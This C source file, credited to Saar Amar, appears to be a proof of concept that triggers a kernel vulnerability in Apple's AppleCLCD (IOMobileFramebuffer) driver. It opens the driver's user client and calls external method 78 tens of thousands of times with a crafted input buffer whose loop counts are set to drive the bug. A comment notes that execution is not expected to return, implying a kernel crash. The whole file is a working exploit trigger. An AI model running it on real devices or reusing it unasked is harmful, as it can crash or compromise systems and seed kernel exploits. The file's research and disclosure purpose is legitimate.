//
//  poc.c
//  iomfb_poc
//
//  Created by Saar Amar.
//

#include "poc.h"

io_connect_t get_iomfb_uc(void) {
    kern_return_t ret;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    int type = 0;
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("AppleCLCD"));
    
    if(service == MACH_PORT_NULL) {
        printf("[-] failed to open service\n");
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD service: 0x%x\n", service);

    ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
    if(ret != KERN_SUCCESS) {
        printf("[-] failed to open userclient: %s\n", mach_error_string(ret));
        return MACH_PORT_NULL;
    }
    
    printf("[*] AppleCLCD userclient: 0x%x\n", shared_user_client_conn);
    
    return shared_user_client_conn;
}

void do_trigger(io_connect_t iomfb_uc) {
    kern_return_t ret = KERN_SUCCESS;
    size_t input_size = 0x180;
    
    uint64_t scalars[2] = { 0 };

    char *input = (char*)malloc(input_size);
    if (input == NULL) {
        perror("malloc input");
        return;
    }
    
    memset(input, 0x41, input_size);
    int *pArr = (int*)input;

    pArr[0] = 0x3;          // sub-sub selector
    pArr[1] = 0xffffffff;   // has to be non-zero
    pArr[2] = 0x40000001;   // #iterations in the outer loop (new_from_data)
    pArr[3] = 2;
    pArr[8] = 2;
    pArr[89] = 4;           // #iterations in the inner loop (set_table)
    
    /* each call trigger a flow with a lot of calls to set_table(), while
       each set_table() flow will do a loop of only 4 iterations*/
    for (size_t i = 0; i < 0x10000; ++i) {
        ret = IOConnectCallMethod(iomfb_uc, 78,
                            scalars, 2,
                            input, input_size,
                            NULL, NULL,
                            NULL, NULL);
    }

    if (ret != KERN_SUCCESS) {
        printf("s_set_block failed, ret == 0x%x --> %s\n", ret, mach_error_string(ret));
    } else {
        printf("success!\n");
    }
    
    free(input);
}


void poc(void) {
    io_connect_t iomfb_uc = get_iomfb_uc();
    if (iomfb_uc == MACH_PORT_NULL) {
       return;
    }
    
    do_trigger(iomfb_uc);
    
    // we don't reach here, but for completness
    IOServiceClose(iomfb_uc);
}
